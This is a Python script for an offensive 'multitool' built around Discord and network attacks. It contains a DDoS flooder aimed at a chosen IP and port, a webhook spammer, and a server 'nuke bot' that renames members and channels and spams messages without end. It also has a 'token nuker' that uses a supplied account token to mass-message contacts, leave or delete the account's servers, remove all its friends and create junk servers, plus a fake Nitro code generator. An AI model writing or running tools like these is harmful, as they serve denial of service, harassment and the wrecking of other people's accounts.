import time
import requests
import threading
from colorama import Fore, Style, init
init(autoreset=True)
import string
import random
import discord
import socket
from bs4 import BeautifulSoup
import pycountry
import asyncio
import os

def set_cmd_title(title):
    os.system(f"title {title}")


set_cmd_title("0x multitool")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def ping_ip(ip, port, protocol='tcp'):
    try:
        if protocol.lower() == 'tcp':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif protocol.lower() == 'udp':
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            raise ValueError("Protocol must be 'tcp' or 'udp'.")

        s.settimeout(1)
        s.connect((ip, port))
        print(f"{Fore.GREEN}Successfully pinged {ip}:{port} using {protocol.upper()}.")
    except Exception as e:
        print(f"{Fore.RED}Failed to ping {ip}:{port} using {protocol.upper()}. Error: {str(e)}")
    finally:
        s.close()

def ip_pinger():
    ip_address = input("Enter the IP address to ping: ")
    port_number = int(input("Enter the port number to ping: "))
    protocol_type = input("Enter the protocol (TCP/UDP) to use: ")

    ping_ip(ip_address, port_number, protocol_type)


def get_ip_of_website():
    website = input("Enter the website URL: ")
    try:
        ip_address = socket.gethostbyname(website)
        print(f"IP-adressen for {website} er: {ip_address}")
    except socket.gaierror:
        print(f"Kunne ikke finde IP-adressen for {website}")

def ddos_panel():
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    duration = int(input("Enter the duration of the attack (in seconds): "))

    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.connect((target_ip, target_port))

    start_time = time.time()
    while time.time() - start_time < duration:
        udp_payload = random.randbytes(random.randint(50, 1024))
        udp_socket.sendto(udp_payload, (target_ip, target_port))
        tcp_payload = random.randbytes(random.randint(50, 1024))
        tcp_socket.send(tcp_payload)

    udp_socket.close()
    tcp_socket.close()

    print("{Fore.RED}DDoS attack completed.")

def discord_webhook_spammer(url, message, amount):
    for i in range(amount):
        data = {
            "content": message
        }
        requests.post(url, data=data)
        time.sleep(0.02)  

def nuke_bot():
    class ServerNuker:
        def __init__(self, bot_token, server_id, message, server_name):
            self.bot_token = bot_token
            self.server_id = server_id
            self.message = message
            self.server_name = server_name
            self.bot = discord.Client(intents=discord.Intents.default())

        async def on_ready(self):
            print(f'Logged in as {self.bot.user}')
            await self.nuke()

        async def nuke(self):
            server = self.bot.get_guild(self.server_id)
            if server is None:
                print(f"Could not find server with ID {self.server_id}")
                await self.bot.close()
                return

            for member in server.members:
                try:
                    await member.edit(nick="0x")
                except Exception as e:
                    print(f"Failed to rename member {member.name}: {e}")

            await server.edit(name=self.server_name)

            tasks = []
            for channel in server.channels:
                try:
                    await channel.edit(name="0x")
                    if isinstance(channel, discord.TextChannel):
                        tasks.append(self.spam_channel(channel, self.message))
                except Exception as e:
                    print(f"Failed to rename channel {channel.name}: {e}")

            for i in range(10):
                try:
                    new_channel = await server.create_text_channel('0x')
                    tasks.append(self.spam_channel(new_channel, self.message))
                except Exception as e:
                    print(f"Failed to create channel: {e}")

            await asyncio.gather(*tasks)

        async def spam_channel(self, channel, message):
            while True:
                try:
                    await channel.send(message)
                    await asyncio.sleep(0.02)  
                except Exception as e:
                    print(f"{Fore.RED}Failed to send message to {channel.name}: {e}")

        def run(self):
            self.bot.event(self.on_ready)
            self.bot.run(self.bot_token)

    bot_token = input("Enter the Discord bot token: ")
    server_id = int(input("Enter the server ID: "))
    message = input("Enter the message to spam: ")
    server_name = input("Enter the name for the server: ")

    nuker = ServerNuker(bot_token, server_id, message, server_name)
    nuker.run()

def generate_nitro_code(length):
    letters_and_digits = string.ascii_letters + string.digits
    code = ''.join(random.choice(letters_and_digits) for i in range(length))
    return code

def generate_nitro_codes(num_codes, code_length):
    nitro_codes = []
    for _ in range(num_codes):
        code = generate_nitro_code(code_length)
        nitro_codes.append(code)
    return nitro_codes

def token_checker(token):
    try:
        client = discord.Client()
        client.login(token)
        print("Token is working")
    except discord.LoginFailure:
        print("Invalid token")
    except discord.HTTPException as e:
        if e.status == 401:
            print("Unauthorized token")
        else:
            print("An error occurred while connecting to Discord")



def Spinner():
    
    print("Spinner: Initieret...", end="\r")
    for i in range(10):
        print(f"Spinner: {i * '.'} {(10 - i) * ' '}", end="\r")
        time.sleep(0.5)
    print("\nSpinner: done")

def hypesquad_joiner():
    Spinner()
    print(f'''\n[\x1b[95m1\x1b[95m\x1B[37m] {Fore.MAGENTA}Bravery{Fore.RESET}
[\x1b[95m2\x1b[95m\x1B[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
[\x1b[95m3\x1b[95m\x1B[37m] {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
[\x1b[95m4\x1b[95m\x1B[37m] Leave The HypeSquad''')

    try:
        house = int(input("\n[>] Choice: "))
    except ValueError:
        print(f"[!] Please enter a valid choice (1-4).")
        return

    if house < 1 or house > 4:
        print(f"[!] Please enter a valid choice (1-4).")
        return

    try:
        token = input("Enter your token: ")
    except KeyboardInterrupt:
        print(f"\n[!] User exited the script.")
        return

    def hype():
        headers = {'Authorization': token}

        if house == 1:
            housefinal = '1'
        elif house == 2:
            housefinal = '2'
        elif house == 3:
            housefinal = '3'
        else:
            housefinal = None

        if housefinal is not None:
            payload = {
                'house_id': housefinal
            }
            rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
            if rep.status_code == 204:
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
            else:
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed')
        else:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed')

    threading.Thread(target=hype).start()
    time.sleep(1)
    input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')


def token_nuker(token, server_name, message_content):
    if threading.active_count() <= 100:
        t = threading.Thread(target=custom_seizure, args=(token,))
        t.start()

    def getheaders(token):
        return {'Authorization': token}

    channel_ids_url = f'https://discord.com/api/v9/users/@me/channels'
    channel_ids_response = requests.get(channel_ids_url, headers=getheaders(token))
    channel_ids = channel_ids_response.json()

    for channel in channel_ids:
        try:
            requests.post(f'{channel_ids_url}/{channel["id"]}/messages',
                           headers=getheaders(token),
                           data={"content": f"{message_content}"})
            print(f"[ $ ] ID: " + channel['id'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    print("\n\nSent Message to ALL friends\n")

    guilds_url = "https://discord.com/api/v8/users/@me/guilds"
    guilds_response = requests.get(guilds_url, headers=getheaders(token))
    guilds = guilds_response.json()

    for guild in guilds:
        try:
            requests.delete(
                f'{guilds_url}/{guild["id"]}', headers={'Authorization': token})
            print(f"[ $ ] Left Server: " + guild['name'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for guild in guilds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/{guild["id"]}', headers={'Authorization': token})
            print(f'[ $ ] Deleted: ' + guild['name'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print("\nLeft / Deleted Guilds\n")

    friend_ids_url = "https://discord.com/api/v9/users/@me/relationships"
    friend_ids_response = requests.get(friend_ids_url, headers=getheaders(token))
    friend_ids = friend_ids_response.json()

    for friend in friend_ids:
        try:
            requests.delete(
                f'{friend_ids_url}/{friend["id"]}', headers=getheaders(token))
            print(f"[ $ ] Removed Friend: " + friend['user']['username'] + "#" + friend['user']['discriminator'])
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print("\nRemoved all available friends\n")

    for i in range(100):
        try:
            payload = {'name': f'{server_name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v9/guilds', headers=getheaders(token), json=payload)
            print(f"[ $ ] Created | {i}")
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

def custom_seizure(token):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
    pass



def main():
    clear_screen()
    set_cmd_title("0x MULTITOOL")
    name = __name__
    print(f'{Fore.CYAN}               ')
    print(f"{Fore.GREEN}_____/\\\\\\\__________________        ")
    print(f"{Fore.GREEN} ___/\\\/////\\\________________       ")
    print(f"{Fore.GREEN}  __/\\\____\//\\\_______________     ")
    print(f"{Fore.GREEN}   _\/\\\_____\/\\\__/\\\____/\\\_    ")
    print(f"{Fore.GREEN}   _\/\\\_____\/\\\_\///\\\/\\\/__   ")
    print(f"{Fore.GREEN}     _\/\\\_____\/\\\___\///\\\/____  ")
    print(f"{Fore.GREEN}     _\//\\\____/\\\_____/\\\/\\\___ ")
    print(f"{Fore.GREEN}       __\///\\\\\\\/____/\\\/\///\\\_ ")
    print(f"{Fore.GREEN}        ____\///////_____\///____\///__ ")
    print(f"{Fore.GREEN}                                                                                         ")
    print(f"{Fore.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("                                                                                                                               ")
    print(f"{Fore.BLUE}┍━━━━━Choices:━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|▻{Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 1.】 IP PINGER                             【 9.】    HYPESQUAD JOINER             {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 2.】 COMMING SOON                          【 10.】   ACCOUNT NUKER                {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 3.】 WEBSITE IP GRABBER                    【 11.】   COMMING SOON                 {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 4.】 DDOS PANEL                                                                    {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 5.】 DISCORD WEBHOOK SPAMMER                                                       {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 6.】 NUKE BOT                                                                      {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 7.】 NITRO GENERATOR                                                               {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}【 8.】 TOKEN CHECKER                                                                 {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}                                                                                      {Fore.RESET}")
    print(f"{Fore.BLUE}│ {Fore.RESET} {Fore.RED}                            <-  0. Exit  ->                                           {Fore.RESET}")
    print(f"{Fore.BLUE}└────────────────────────────────────────────────────────────────────────────────────────────────────────────▻{Fore.RESET}")
    print("")
    print(f"{Fore.WHITE}╔════[{Fore.RESET}{Fore.MAGENTA}@0x{Fore.RESET}{Fore.WHITE}]{Fore.RESET}")

    while True:
        choice = input(f"{Fore.WHITE}╚══>{Fore.RESET}")

        if choice == "1":
            ip_pinger()
        elif choice == "3":
            get_ip_of_website()
        elif choice == "4":
            ddos_panel()
        elif choice == "5":
            url = input("Enter the Discord webhook URL: ")
            message = input("Enter the message to spam: ")
            amount = int(input("Enter the number of messages to spam: "))
            threading.Thread(target=discord_webhook_spammer, args=(url, message, amount), daemon=True).start()
        elif choice == "6":
            nuke_bot()
        elif choice == "7":
            num_codes = int(input("How many nitro codes do you want to generate? "))
            code_length = 16
            nitro_codes = generate_nitro_codes(num_codes, code_length)
            for code in nitro_codes:
                print(code)
        elif choice == "8":
            token = input("Enter the token to check: ")
            token_checker(token)
        elif choice == "9":
            hypesquad_joiner()
        elif choice == "10":
            token_nuker()
        elif choice == "0":
            exit()
        else:
            print("Invalid choice.")

if __name__ == '__main__':
    main()